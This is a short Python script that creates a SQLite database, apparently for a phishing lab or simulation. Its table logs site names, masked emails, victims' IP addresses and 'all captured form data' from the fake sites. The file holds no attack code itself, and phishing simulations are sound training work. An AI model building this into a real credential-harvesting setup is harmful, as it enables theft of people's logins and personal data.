import sqlite3
from pathlib import Path

DB_PATH = Path(__file__).parent / "phishlab.db"

def get_conn():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_conn()
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            site_name TEXT NOT NULL,
            masked_email TEXT NOT NULL,
            -- Store all captured form data as a JSON string
            captured_data TEXT NOT NULL,
            ip_address TEXT NOT NULL,
            timestamp TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

if __name__ == '__main__':
    init_db()
    print("DB initialized at", DB_PATH)
